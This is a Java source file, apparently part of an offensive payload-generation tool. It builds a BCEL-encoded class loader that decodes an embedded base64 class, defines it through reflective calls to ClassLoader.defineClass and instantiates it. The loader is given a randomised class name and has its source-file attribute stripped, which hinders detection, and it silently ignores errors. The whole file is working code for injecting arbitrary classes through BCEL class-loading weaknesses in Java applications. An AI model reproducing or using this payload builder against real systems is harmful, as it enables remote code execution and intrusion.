package jeg.common.format;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import jeg.common.config.Config;
import jeg.common.util.Base64Util;
import jeg.common.util.ClassUtil;
import jeg.common.util.JavassistUtil;
import me.gv7.woodpecker.bcel.HackBCELs;

import java.io.IOException;
import java.lang.reflect.Method;

public class BCELFormatter implements IFormatter {
    public byte[] transform(byte[] bytes, Config config) throws IOException {
        ClassPool pool = ClassPool.getDefault();
        ClassClassPath classPath = new ClassClassPath(BCELoader.class);
        pool.insertClassPath(classPath);
        CtClass ctClass;
        byte[] bcelLoaderBytes = new byte[0];
        try {
            ctClass = pool.getCtClass(BCELoader.class.getName());
            CtMethod getBase64String = ctClass.getDeclaredMethod("getBase64String");
            getBase64String.setBody(String.format("{return \"%s\";}", Base64Util.encodeToBase64(config.getClassBytesInFormatter())));
            CtMethod getClassName = ctClass.getDeclaredMethod("getClassName");
            getClassName.setBody(String.format("{return \"%s\";}", config.getClassNameInFormatter()));
            ctClass.setName(ClassUtil.getRandomClassName());
            ctClass.getClassFile().setVersionToJava5();
            JavassistUtil.removeSourceFileAttribute(ctClass);
            bcelLoaderBytes = ctClass.toBytecode();
            ctClass.detach();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return HackBCELs.encode(bcelLoaderBytes).getBytes();
    }
}

class BCELoader extends ClassLoader {

    public String getClassName() {
        return "";
    }


    public String getBase64String() throws IOException {
        return "";
    }

    public BCELoader() throws Exception {
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        ;
        try {
            classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception var1) {
            try {
                byte[] classBytes = base64Decode(getBase64String());
                Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClassMethod.setAccessible(true);
                Class clazz = (Class) defineClassMethod.invoke(classLoader, classBytes, 0, classBytes.length);
                clazz.newInstance();
            } catch (Exception var2) {
            }
        }
    }

    public static byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) ((byte[]) ((byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str)));
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object) null);
            return (byte[]) ((byte[]) ((byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str)));
        }
    }
}

